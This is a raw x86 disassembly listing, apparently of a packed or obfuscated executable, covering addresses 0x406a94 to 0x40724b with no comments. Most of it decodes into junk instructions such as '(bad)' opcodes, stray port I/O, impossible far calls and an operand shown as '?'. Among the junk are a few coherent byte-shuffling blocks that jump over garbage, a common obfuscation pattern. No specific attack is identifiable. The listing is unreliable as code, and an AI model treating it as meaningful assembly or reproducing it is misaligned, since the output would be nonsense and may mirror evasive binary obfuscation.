  406a94:	cmp    eax,0x1843be9b
  406a99:	mov    edi,0xbcd5ff1f
  406a9e:	out    0xaa,al
  406aa0:	(bad)  
  406aa1:	jne    0x406abc
  406aa3:	inc    ecx
  406aa4:	push   edx
  406aa5:	jge    0x406afd
  406aa7:	int3   
  406aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aa9:	pusha  
  406aaa:	shl    DWORD PTR [esi+0x1aa73131],1
  406ab0:	shl    DWORD PTR [esi-0x2b06fd02],1
  406ab6:	and    eax,0xee743e98
  406abb:	ins    DWORD PTR es:[edi],dx
  406abc:	iret   
  406abd:	aaa    
  406abe:	or     edx,DWORD PTR fs:[ebp+0x4b8c7492]
  406ac5:	fdiv   st,st(2)
  406ac7:	mov    BYTE PTR [ecx-0x6235a6fa],dl
  406acd:	test   DWORD PTR [ecx-0x317cc4c0],ecx
  406ad3:	jle    0x406aca
  406ad5:	push   esi
  406ad6:	hlt    
  406ad7:	mov    ch,BYTE PTR [ebp+0x5f]
  406ada:	rol    BYTE PTR [esi+0x70],1
  406add:	lock clc 
  406adf:	push   esp
  406ae0:	sub    esi,DWORD PTR [esi+0x241e89b]
  406ae6:	adc    dh,BYTE PTR [eax+esi*4-0x6742bfaf]
  406aed:	sbb    al,0xc5
  406aef:	popf   
  406af0:	dec    eax
  406af1:	ret    
  406af2:	jecxz  0x406ae7
  406af4:	sub    eax,0x557f4520
  406af9:	repnz pop ss
  406afb:	out    dx,eax
  406afc:	and    DWORD PTR [esp+ecx*2-0x28],ebx
  406b00:	mov    esi,0xc08fa26b
  406b05:	call   DWORD PTR [eax+0x5d]
  406b08:	pop    ebp
  406b09:	test   esi,edi
  406b0b:	mov    bh,0x6b
  406b0d:	mov    al,BYTE PTR [edx-0x14]
  406b10:	pushf  
  406b11:	fdivr  QWORD PTR [edx]
  406b13:	cmp    eax,0x31571b54
  406b18:	xlat   BYTE PTR ds:[ebx]
  406b19:	popa   
  406b1a:	imul   ebp,DWORD PTR [edx+edx*2+0x3a326f56],0x2befe13c
  406b25:	mov    ebp,ds
  406b27:	pop    es
  406b28:	enter  0x24ed,0xea
  406b2c:	inc    ebx
  406b2d:	push   ebp
  406b2e:	ja     0x406ab3
  406b30:	shl    BYTE PTR [esi],1
  406b32:	clc    
  406b33:	pop    edi
  406b34:	dec    edi
  406b35:	adc    eax,0xa636c0d3
  406b3a:	inc    edx
  406b3b:	dec    edi
  406b3c:	addr16 iret 
  406b3e:	fimul  WORD PTR [ebp-0x31]
  406b41:	and    DWORD PTR [eax+ebx*2],esp
  406b44:	mov    eax,0xd4021f27
  406b49:	rcr    dl,cl
  406b4b:	fidivr WORD PTR [ebp+0x3]
  406b4e:	shr    ecx,1
  406b50:	pop    esi
  406b51:	add    al,0x0
  406b53:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax+0x4373d876],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b92
  406b8f:	jg     0x406b45
  406b91:	or     ah,ah
  406b93:	int3   
  406b94:	cmp    DWORD PTR [ebp+0x6d],esi
  406b97:	fs (bad) 
  406b99:	adc    al,BYTE PTR [esi+eax*2]
  406b9c:	sub    BYTE PTR [ebx+0x1e],bh
  406b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ba0:	aas    
  406ba1:	xor    eax,0xb772bafe
  406ba6:	bound  esi,QWORD PTR [ecx+0x38]
  406ba9:	loop   0x406b65
  406bab:	imul   esp,DWORD PTR [ebp+0x7c],0xfd76d1b8
  406bb2:	push   cs
  406bb3:	shl    BYTE PTR [esi-0x5423a24a],1
  406bb9:	es xor eax,0x36777b42
  406bbf:	(bad)  
  406bc1:	push   cs
  406bc2:	mov    esp,0xd2015525
  406bc7:	cmp    BYTE PTR [ecx+eax*8],dh
  406bca:	xchg   esi,eax
  406bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bcc:	and    ah,al
  406bce:	cdq    
  406bcf:	mov    dh,0x6b
  406bd1:	std    
  406bd2:	mov    dl,0xef
  406bd4:	shl    dh,1
  406bd6:	aam    0xaf
  406bd8:	and    edi,esi
  406bda:	and    cl,dl
  406bdc:	out    0xc5,al
  406bde:	ds fmul st,st(5)
  406be1:	xchg   ebx,eax
  406be2:	call   0x8d07:0x2eefaa04
  406be9:	adc    bl,BYTE PTR [ecx]
  406beb:	int3   
  406bec:	(bad)  
  406bed:	push   ss
  406bee:	mov    ebp,0xd2e10cc6
  406bf3:	loope  0x406baa
  406bf5:	(bad)  
  406bf6:	inc    ecx
  406bf7:	inc    esp
  406bf8:	mov    ecx,0x49441e3a
  406bfd:	fmul   st(3),st
  406bff:	push   eax
  406c00:	and    edi,esp
  406c02:	dec    ecx
  406c03:	stc    
  406c04:	out    0x98,eax
  406c06:	jmp    0x406c41
  406c08:	jae    0x406c62
  406c0a:	lock out 0x8b,al
  406c0d:	sub    eax,0xa749864e
  406c12:	sub    DWORD PTR [edx],0x1902673f
  406c18:	dec    ecx
  406c19:	xor    BYTE PTR [ecx+0x2c],dl
  406c1c:	cmp    BYTE PTR ds:0x93af44e7,ah
  406c22:	xchg   esi,eax
  406c23:	enter  0x84eb,0xaf
  406c27:	jo     0x406c05
  406c29:	aam    0x2
  406c2b:	stos   BYTE PTR es:[edi],al
  406c2c:	mov    dl,0x3c
  406c2e:	or     ch,BYTE PTR [eax+0xa511df4]
  406c34:	mov    ebp,0xae0cfc4d
  406c39:	add    DWORD PTR [ecx+eiz*8],ebx
  406c3c:	std    
  406c3d:	fmul   QWORD PTR [eax+edx*8]
  406c40:	(bad)  
  406c41:	aam    0xfa
  406c43:	pop    edx
  406c44:	ret    
  406c45:	jno    0x406cbd
  406c47:	jge    0x406c1f
  406c49:	push   edx
  406c4a:	xchg   edx,eax
  406c4b:	pop    edi
  406c4c:	push   edx
  406c4d:	test   eax,0xce2636e2
  406c52:	jne    0x406c71
  406c54:	ins    DWORD PTR es:[edi],dx
  406c55:	and    ch,BYTE PTR [edi]
  406c57:	pop    ebx
  406c58:	enter  0xf553,0x7c
  406c5c:	mov    esi,0x33157a6a
  406c61:	dec    esi
  406c62:	push   edi
  406c63:	enter  0x2fd1,0x1b
  406c67:	mov    cl,0xff
  406c69:	outs   dx,BYTE PTR ds:[esi]
  406c6a:	inc    ebp
  406c6b:	cld    
  406c6c:	das    
  406c6d:	cmp    bl,ah
  406c6f:	cmp    eax,0x832a32c3
  406c74:	ja     0x406c6d
  406c76:	fwait
  406c77:	inc    ebx
  406c78:	ss das 
  406c7a:	lahf   
  406c7b:	jecxz  0x406c0a
  406c7d:	cmp    BYTE PTR fs:[edx],cl
  406c80:	xchg   edx,eax
  406c81:	cli    
  406c82:	push   ebx
  406c83:	sbb    ecx,ebx
  406c85:	aad    0x5a
  406c87:	xor    eax,DWORD PTR [eax+esi*2]
  406c8a:	pop    ebx
  406c8b:	jb     0x406cfe
  406c8d:	repz sub ebp,DWORD PTR [eax-0x4b8bff21]
  406c94:	adc    eax,0x357582a6
  406c99:	sub    DWORD PTR [edx-0x28],ecx
  406c9c:	popf   
  406c9d:	cs inc esi
  406c9f:	add    eax,0x139a3689
  406ca4:	fucomp st(1)
  406ca6:	cmc    
  406ca7:	push   cs
  406ca8:	jae    0x406c2f
  406caa:	inc    ecx
  406cab:	jbe    0x406c41
  406cad:	mov    al,0x93
  406caf:	shr    edx,0x75
  406cb2:	jo     0x406c90
  406cb4:	xor    al,0xf6
  406cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb7:	xor    eax,edi
  406cb9:	pop    es
  406cba:	or     eax,0xd6131b63
  406cbf:	out    dx,al
  406cc0:	aam    0x6a
  406cc2:	popa   
  406cc3:	mov    edi,DWORD PTR [ebp-0x1c]
  406cc6:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406ccd:	mov    BYTE PTR [ebp+0xb],dl
  406cd0:	mov    dl,BYTE PTR [ebp+0xf]
  406cd3:	mov    edi,DWORD PTR [ebp-0xc]
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ror    BYTE PTR ss:[ecx-0x1b],0xb0
  406cf3:	xchg   esp,eax
  406cf4:	pop    es
  406cf5:	jle    0x406d75
  406cf7:	and    edi,DWORD PTR [edi+0x7e]
  406cfa:	jle    0x406d41
  406cfc:	add    cl,ch
  406cfe:	jns    0x406cf2
  406d00:	dec    esp
  406d01:	mov    al,0xb3
  406d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d04:	pushf  
  406d05:	mov    ecx,0xe4e40507
  406d0a:	cmp    al,0x63
  406d0c:	jg     0x406d19
  406d0e:	jmp    FWORD PTR [edi]
  406d10:	in     eax,dx
  406d11:	push   esi
  406d12:	ss pop esp
  406d14:	scas   eax,DWORD PTR es:[edi]
  406d15:	mov    al,ds:0x8877c945
  406d1a:	loopne 0x406d1f
  406d1c:	push   ebx
  406d1d:	shl    BYTE PTR [ebx-0xc],0xd1
  406d21:	and    BYTE PTR [esi],al
  406d23:	mov    bl,0xc
  406d25:	mov    bh,0x75
  406d27:	push   edx
  406d28:	es out 0xc9,al
  406d2b:	sahf   
  406d2c:	sbb    al,0x4a
  406d2e:	jl     0x406d1c
  406d30:	push   0x21
  406d32:	add    al,bh
  406d34:	xchg   ebp,eax
  406d35:	aam    0x97
  406d37:	and    eax,0x6e
  406d3a:	rep outs dx,BYTE PTR ds:[esi]
  406d3c:	mov    eax,0x7fad7df2
  406d41:	in     al,0x4c
  406d43:	xor    esp,DWORD PTR [esi-0x383ffd17]
  406d49:	push   ds
  406d4a:	jno    0x406ccf
  406d4c:	sbb    ah,BYTE PTR [eax]
  406d4e:	int    0x2
  406d50:	cmp    DWORD PTR [edx],0x227938e2
  406d56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d57:	dec    eax
  406d58:	and    al,0x7
  406d5a:	jbe    0x406cff
  406d5c:	out    dx,al
  406d5d:	push   ecx
  406d5e:	mov    ecx,0x903e729d
  406d63:	sbb    eax,0x971a71c0
  406d68:	mov    ?,esi
  406d6a:	cdq    
  406d6b:	retf   0x84b3
  406d6e:	mov    edx,0xf0b4e9eb
  406d73:	in     eax,0x68
  406d75:	sub    ebx,DWORD PTR [edi-0xa]
  406d78:	push   0x6f1adc3f
  406d7d:	mov    fs,ecx
  406d7f:	aaa    
  406d80:	les    ebx,FWORD PTR [ebx+0x5]
  406d83:	mov    dh,0x2d
  406d85:	or     ebx,ecx
  406d87:	xchg   esp,eax
  406d88:	jbe    0x406d82
  406d8a:	popf   
  406d8b:	push   0x51f3d3fb
  406d90:	in     eax,dx
  406d91:	and    DWORD PTR [eax],0x50
  406d94:	scas   eax,DWORD PTR es:[edi]
  406d95:	inc    esp
  406d96:	pop    ss
  406d97:	push   edi
  406d98:	aam    0x7
  406d9a:	rcl    BYTE PTR [eax-0x24],1
  406d9d:	jp     0x406e0c
  406d9f:	inc    esp
  406da0:	pop    edi
  406da1:	jnp    0x406db8
  406da3:	pop    ebx
  406da4:	enter  0x7e2d,0xf5
  406da8:	neg    ah
  406daa:	clc    
  406dab:	cwde   
  406dac:	mov    ah,0xbd
  406dae:	fwait
  406daf:	and    bl,BYTE PTR [ecx+0x4714c610]
  406db5:	or     BYTE PTR [ecx],0x3
  406db8:	xor    bh,BYTE PTR [ebx+0x2f]
  406dbb:	les    eax,FWORD PTR [esi+0x2d]
  406dbe:	imul   eax,DWORD PTR [esi+ecx*8],0xe76d54c
  406dc5:	sti    
  406dc6:	mov    bl,0x1f
  406dc8:	sbb    ebx,DWORD PTR [ebp-0x3189de30]
  406dce:	add    ah,BYTE PTR [ecx]
  406dd0:	mov    ch,bh
  406dd2:	inc    ebx
  406dd3:	push   ecx
  406dd4:	push   0xffffffa6
  406dd6:	cmp    BYTE PTR [esi],al
  406dd8:	ficom  DWORD PTR [ebx-0x7a]
  406ddb:	dec    eax
  406ddc:	cmp    DWORD PTR [edx-0x27cc23a0],esi
  406de2:	neg    DWORD PTR [ebx+esi*4]
  406de5:	adc    BYTE PTR [esi+ebx*4+0x21],bh
  406de9:	adc    ebx,DWORD PTR [edi-0x62977db8]
  406def:	mov    edx,0x4e35d139
  406df4:	mov    es,WORD PTR [esi-0x44]
  406df7:	mov    ds:0x920ba372,al
  406dfc:	xor    DWORD PTR [edx-0xfe85b5a],0x44a4682a
  406e06:	es (bad) 
  406e08:	into   
  406e09:	mov    DWORD PTR [edi],esi
  406e0b:	dec    ebp
  406e0c:	imul   edx,DWORD PTR [eax],0x2a63b99b
  406e12:	es push edx
  406e14:	sbb    eax,0x7abdd66e
  406e19:	stos   BYTE PTR es:[edi],al
  406e1a:	popf   
  406e1b:	in     al,dx
  406e1c:	sbb    DWORD PTR [esi-0x1bba7b1e],ecx
  406e22:	push   es
  406e23:	cmc    
  406e24:	mov    ecx,0xddb467d7
  406e29:	and    eax,0x1befb281
  406e2e:	fs mov edi,0x9f1f9488
  406e34:	jb     0x406e68
  406e36:	add    cl,ch
  406e38:	dec    ebp
  406e39:	add    DWORD PTR [eax],eax
  406e3b:	add    BYTE PTR [ecx+0x24],bh
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	gs call 0x7e7e:0x459c39b
  406e50:	and    edi,DWORD PTR [edi+0x7e]
  406e53:	jle    0x406ea3
  406e55:	adc    BYTE PTR [edi+ebx*1-0x79e15e0],dh
  406e5c:	jg     0x406e53
  406e5e:	ds push edi
  406e60:	nop
  406e61:	add    ebp,eax
  406e63:	bound  esi,QWORD PTR [ecx+0x383fe38a]
  406e69:	and    DWORD PTR [esi],ebp
  406e6b:	mov    ch,0x85
  406e6d:	std    
  406e6e:	or     al,0x2d
  406e70:	cld    
  406e71:	repz sub DWORD PTR [eax+0x21],0xa77c7c4f
  406e79:	addr16 dec edi
  406e7b:	int    0x9a
  406e7d:	mul    DWORD PTR [edx-0x23fcb96c]
  406e83:	mov    bl,0x62
  406e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e86:	rcr    cl,cl
  406e88:	push   cs
  406e89:	ins    BYTE PTR es:[edi],dx
  406e8a:	(bad)  
  406e8b:	mov    ah,BYTE PTR [edi+ebx*4+0x22]
  406e8f:	mov    ds:0x6508f9ad,eax
  406e94:	int    0x1
  406e96:	les    edx,FWORD PTR [esi+ebp*8-0xb]
  406e9a:	in     al,0x5d
  406e9c:	jno    0x406ecb
  406e9e:	add    eax,0x8c834e0a
  406ea3:	and    esi,esi
  406ea5:	(bad)  
  406ea7:	pop    edi
  406ea8:	je     0x406e7d
  406eaa:	je     0x406e7b
  406eac:	sbb    BYTE PTR [ecx+ebp*8-0x42a0fd35],0x74
  406eb4:	js     0x406e94
  406eb6:	push   es
  406eb7:	adc    eax,0xd9bc70b
  406ebc:	add    DWORD PTR [edi+0x3],edx
  406ebf:	rcr    eax,cl
  406ec1:	add    bl,BYTE PTR [ebx-0x55]
  406ec4:	gs dec ebp
  406ec6:	pop    es
  406ec7:	sub    eax,0x7c5669a7
  406ecc:	or     ch,BYTE PTR [ebp-0x66769206]
  406ed2:	out    dx,eax
  406ed3:	retf   
  406ed4:	fs pop es
  406ed6:	xchg   esi,eax
  406ed7:	imul   eax,esp,0xcd4aa2c6
  406edd:	fxch   st(5)
  406edf:	push   ebp
  406ee0:	scas   al,BYTE PTR es:[edi]
  406ee1:	sub    eax,0x4c31755a
  406ee6:	push   ebp
  406ee7:	sbb    ebx,DWORD PTR [edi]
  406ee9:	sub    edi,DWORD PTR [eax+0x2793070a]
  406eef:	sti    
  406ef0:	xchg   esi,eax
  406ef1:	fcmovbe st,st(6)
  406ef3:	xor    ebx,DWORD PTR [esi+0xd524401]
  406ef9:	jb     0x406f11
  406efb:	cli    
  406efc:	mov    ebx,0xe1b5326b
  406f01:	cwde   
  406f02:	lds    ebp,FWORD PTR [edi+0x323126bb]
  406f08:	imul   edx,esp,0x61f09cbd
  406f0e:	imul   edx,DWORD PTR [eax],0xffffffe0
  406f11:	scas   eax,DWORD PTR es:[edi]
  406f12:	add    bl,BYTE PTR [ebx-0x7af19676]
  406f18:	js     0x406f4e
  406f1a:	or     eax,0xdd2db2c9
  406f1f:	add    DWORD PTR [ebx-0x52],edx
  406f22:	scas   al,BYTE PTR es:[edi]
  406f23:	xchg   BYTE PTR [ebp-0x14b7ef6],bh
  406f29:	inc    esp
  406f2a:	or     DWORD PTR [eax-0x48],edx
  406f2d:	pop    edi
  406f2e:	lock fcomp QWORD PTR [ebp+eiz*1-0x20]
  406f33:	sbb    DWORD PTR [esi+0x5f82b21b],esi
  406f39:	test   BYTE PTR [edx-0x12],ch
  406f3c:	aam    0xe0
  406f3e:	inc    edx
  406f3f:	rcl    DWORD PTR [ebx],cl
  406f41:	mov    ebp,0xcaba6e23
  406f46:	ins    BYTE PTR es:[edi],dx
  406f47:	inc    ebx
  406f48:	fdiv   st(5),st
  406f4a:	lock cmp bh,BYTE PTR [edx]
  406f4d:	mov    BYTE PTR [edi-0x435b2c63],dh
  406f53:	inc    edi
  406f54:	push   ebx
  406f55:	adc    esi,esp
  406f57:	ins    BYTE PTR es:[edi],dx
  406f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f59:	or     eax,0x8d4c9ecc
  406f5e:	imul   esp,DWORD PTR [ecx],0xb7080fcc
  406f64:	mov    bl,0xb5
  406f66:	sbb    BYTE PTR [esi+ebp*2-0x77],cl
  406f6a:	test   BYTE PTR [esp+edi*1-0x63],dl
  406f6e:	scas   al,BYTE PTR es:[edi]
  406f6f:	or     esi,esp
  406f71:	sub    dh,BYTE PTR [ebp+0x447292fb]
  406f77:	cdq    
  406f78:	inc    ecx
  406f79:	loope  0x406fcf
  406f7b:	push   ss
  406f7c:	push   eax
  406f7d:	inc    edx
  406f7e:	popa   
  406f7f:	sbb    al,BYTE PTR [edx-0x710660d6]
  406f85:	cmc    
  406f86:	clc    
  406f87:	dec    esp
  406f88:	dec    BYTE PTR [edx+0x7d8b0b55]
  406f8e:	call   0x7d4467c6
  406f93:	in     al,dx
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	push   eax
  407010:	mov    DWORD PTR [ebp-0x25],esp
  407013:	add    bl,BYTE PTR [edx]
  407015:	jle    0x407095
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x406fba
  40701c:	leave  
  40701d:	inc    eax
  40701e:	or     eax,DWORD PTR [eax]
  407020:	adc    al,0x7a
  407022:	les    ebx,FWORD PTR [ecx+0x27e9ab1b]
  407028:	xchg   ebp,eax
  407029:	sub    BYTE PTR [ebx-0x2b],dh
  40702c:	push   esp
  40702d:	and    DWORD PTR [esi-0x6e3ffe70],ebp
  407033:	xor    al,0x3
  407035:	and    al,0x6f
  407037:	jge    0x406ffb
  407039:	sub    ebx,DWORD PTR ds:0x3263a731
  40703f:	pop    esi
  407040:	dec    eax
  407041:	(bad)  
  407042:	enter  0xec4f,0x79
  407046:	push   es
  407047:	into   
  407048:	(bad)  
  40704b:	in     al,dx
  40704c:	push   cs
  40704d:	out    dx,eax
  40704e:	lahf   
  40704f:	in     eax,dx
  407050:	out    dx,eax
  407051:	sub    DWORD PTR [ebp-0x574fdee3],edi
  407057:	dec    ecx
  407058:	stos   BYTE PTR es:[edi],al
  407059:	rol    DWORD PTR [esi-0x21],cl
  40705c:	and    al,0xc0
  40705e:	shl    DWORD PTR [edx],0xba
  407061:	sbb    dl,bh
  407063:	cmp    dl,BYTE PTR [edx+0x6d]
  407066:	fisub  DWORD PTR [eax+0x68]
  407069:	es pop ecx
  40706b:	loop   0x4070e4
  40706d:	mov    al,0x89
  40706f:	aam    0x50
  407071:	(bad)  
  407072:	or     al,0x70
  407074:	and    eax,0xb68f2f28
  407079:	js     0x407062
  40707b:	mov    al,0x26
  40707d:	stos   BYTE PTR es:[edi],al
  40707e:	pop    ss
  40707f:	(bad)  
  407080:	in     al,0x2d
  407082:	xor    al,0x5a
  407084:	xor    BYTE PTR [edi-0x2c],cl
  407087:	and    DWORD PTR [ecx+edi*4+0x5409c221],esp
  40708e:	out    0x72,al
  407090:	out    0x24,al
  407092:	ret    0x1069
  407095:	popf   
  407096:	fsubr  DWORD PTR [edi+eiz*1+0x5516ad1b]
  40709d:	adc    dh,BYTE PTR ds:0x4af5a675
  4070a3:	cmp    BYTE PTR [ecx+0x6],ah
  4070a6:	out    0xf5,eax
  4070a8:	push   ebp
  4070a9:	mov    eax,0x132fd322
  4070ae:	lods   al,BYTE PTR ds:[esi]
  4070af:	adc    ecx,DWORD PTR [ebp-0x9]
  4070b2:	enter  0xb885,0x56
  4070b6:	pop    edx
  4070b7:	scas   al,BYTE PTR es:[edi]
  4070b8:	loopne 0x4070c5
  4070ba:	xor    al,0xb1
  4070bc:	pusha  
  4070bd:	in     al,0x10
  4070bf:	inc    eax
  4070c0:	les    esi,FWORD PTR [edx-0x7e]
  4070c3:	jle    0x40708c
  4070c5:	mov    dl,0xfa
  4070c7:	cmc    
  4070c8:	and    dl,bl
  4070ca:	xlat   BYTE PTR ds:[ebx]
  4070cb:	jne    0x407078
  4070cd:	cmp    dh,BYTE PTR [edi-0x3b]
  4070d0:	fidiv  WORD PTR [ebx-0x7f]
  4070d3:	or     BYTE PTR [ebx*4-0x287d45d0],dl
  4070da:	cmp    eax,0x381eaf1f
  4070df:	(bad)  
  4070e1:	xlat   BYTE PTR ds:[ebx]
  4070e2:	mov    ecx,DWORD PTR [esi]
  4070e4:	mov    BYTE PTR [ebx-0x7ba325c],bl
  4070ea:	jecxz  0x407108
  4070ec:	test   BYTE PTR [edi-0x5c],ah
  4070ef:	test   al,0xeb
  4070f1:	call   0xcb96aefe
  4070f6:	sub    edx,edi
  4070f8:	rcr    DWORD PTR [esi+0x3f],cl
  4070fb:	or     BYTE PTR [esi],al
  4070fd:	jp     0x4070c8
  4070ff:	add    al,0x67
  407101:	idiv   bh
  407103:	leave  
  407104:	mov    bl,0xc3
  407106:	inc    esp
  407107:	adc    eax,0x50d89e7f
  40710c:	mov    ah,0x6b
  40710e:	outs   dx,DWORD PTR ds:[esi]
  40710f:	push   0xa4b53835
  407114:	(bad)  
  407115:	loopne 0x407164
  407117:	adc    BYTE PTR [ebx],ch
  407119:	stc    
  40711a:	int3   
  40711b:	inc    esi
  40711c:	loopne 0x4070e9
  40711e:	les    edi,FWORD PTR [ecx]
  407120:	mov    esi,DWORD PTR ds:0x758d6655
  407126:	sbb    edi,DWORD PTR [ecx-0x636b7c02]
  40712c:	inc    edi
  40712d:	push   es
  40712e:	jno    0x40719e
  407130:	adc    cl,BYTE PTR [eax+0x6a]
  407133:	jmp    0xd6277de6
  407138:	loopne 0x4070ce
  40713a:	test   cl,dl
  40713c:	add    eax,0xf2b88229
  407141:	lods   al,BYTE PTR ds:[esi]
  407142:	call   0x747e:0x746d4cb
  407149:	test   al,0x96
  40714b:	aam    0x29
  40714d:	call   0x7d8b:0xd703b157
  407154:	clc    
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0x9
  407180:	gs sub ebx,ebx
  407183:	aaa    
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x4071c3
  40718c:	jmp    0x3bf13889
  407191:	mov    al,ds:0xfd16db59
  407196:	push   esi
  407197:	mov    ebp,0x9e3329e8
  40719c:	mov    dl,0xa1
  40719e:	arpl   cx,ax
  4071a0:	mov    esp,0x7e8d1e0d
  4071a5:	(bad)  
  4071a7:	retf   
  4071a8:	outs   dx,DWORD PTR ds:[esi]
  4071a9:	xchg   ecx,eax
  4071aa:	pop    esp
  4071ab:	nop
  4071ac:	jnp    0x4071c0
  4071ae:	outs   dx,BYTE PTR ds:[esi]
  4071af:	hlt    
  4071b0:	xchg   edx,eax
  4071b1:	add    eax,0x49999317
  4071b6:	mov    BYTE PTR [edi],al
  4071b8:	add    BYTE PTR [ebx-0x4d],dl
  4071bb:	ins    BYTE PTR es:[edi],dx
  4071bc:	bound  ebx,QWORD PTR [ecx-0x3b]
  4071bf:	(bad)  
  4071c0:	out    dx,al
  4071c1:	push   ebx
  4071c2:	lods   al,BYTE PTR ds:[esi]
  4071c3:	pop    eax
  4071c4:	test   eax,0x846d9b79
  4071c9:	cwde   
  4071ca:	lock cld 
  4071cc:	adc    dh,BYTE PTR [ebx+ebp*8]
  4071cf:	jb     0x40717f
  4071d1:	jl     0x40720e
  4071d3:	sbb    bl,BYTE PTR [edx-0x42e68616]
  4071d9:	cwde   
  4071da:	mov    DWORD PTR [ebx],edi
  4071dc:	rol    BYTE PTR [ebx-0x52],1
  4071df:	mov    dh,0x48
  4071e1:	lods   eax,DWORD PTR ds:[esi]
  4071e2:	mov    al,0xc5
  4071e4:	pushf  
  4071e5:	pusha  
  4071e6:	or     eax,DWORD PTR cs:0xd8336706
  4071ed:	test   DWORD PTR [esi],ebp
  4071ef:	adc    BYTE PTR [eax],dh
  4071f1:	cmp    ebx,DWORD PTR [edi+ebx*8]
  4071f4:	fidiv  WORD PTR [ebx-0x8aede4d]
  4071fa:	push   esp
  4071fb:	out    dx,eax
  4071fc:	ins    DWORD PTR es:[edi],dx
  4071fd:	jp     0x4071ec
  4071ff:	xor    eax,0xc3b7a829
  407204:	mov    cl,0xb9
  407206:	sub    BYTE PTR [eiz*2-0x3de1480d],dh
  40720d:	js     0x407286
  40720f:	gs jmp 0xe994:0x47eca8b4
  407217:	jecxz  0x4071ec
  407219:	xchg   esi,eax
  40721a:	add    DWORD PTR [ebx],eax
  40721c:	dec    esp
  40721d:	mov    bl,0x1
  40721f:	push   0x447e897c
  407224:	adc    DWORD PTR [edx+eax*1+0x36871776],ebx
  40722b:	icebp  
  40722c:	in     eax,0xc
  40722e:	scas   al,BYTE PTR es:[edi]
  40722f:	push   ecx
  407230:	jb     0x40725c
  407232:	xor    DWORD PTR [eax-0x72c83a6c],esi
  407238:	fcom   QWORD PTR [ebx+0x77d734f4]
  40723e:	push   edx
  40723f:	mov    al,0x31
  407241:	icebp  
  407242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407243:	aam    0x1
  407245:	ret    
  407246:	adc    BYTE PTR [ecx-0x3b],dh
  407249:	mov    dl,0x5e
  40724b:	call   0xeef5c23b
